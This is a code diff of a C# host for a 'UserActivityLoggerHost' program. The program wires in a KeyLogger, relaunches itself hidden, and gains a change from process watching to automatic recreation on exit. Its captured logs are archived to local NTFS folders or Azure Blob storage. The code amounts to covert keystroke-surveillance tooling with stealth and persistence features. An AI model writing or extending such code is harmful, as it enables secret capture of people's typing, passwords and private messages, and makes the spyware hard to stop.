@@ -14,7 +14,13 @@ namespace Host
         static string _archiveLocation;
         static void Main(string[] args)
         {
-            Logger.LogInforamtion("Started");
+           
+            new JarFileAssemblyLoader().Register();
+            Start(args);
+        }
+
+        private static void Start(string[] args)
+        {
 
             if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost"))
             {
@@ -37,7 +43,7 @@ namespace Host
 
                 var activityLogger = new StartUp(TimeSpan.FromSeconds(2), _localLogFolder, new KeyLogger());
 
-                ProcessHelper.Watch();
+                ProcessHelper.RecreateProcessOnExit();
 
                 activityLogger.Start();
             }
@@ -45,8 +51,8 @@ namespace Host
             {
                 ProcessHelper.RunHidden(System.Reflection.Assembly.GetEntryAssembly().Location);
             }
-        }
 
+        }
 
         static string GetRootFolderPath()
         {
@@ -94,6 +100,7 @@ namespace Host
                     _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_NTFS"];
                     return new NtfsFileSystem();
                     break;
+
                 case "AZUREBLOB":
                     _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_AZUREBLOB"];
                     return new AzureBlobFileSystem(ConfigurationManager.AppSettings["StorageConnectionString"]);
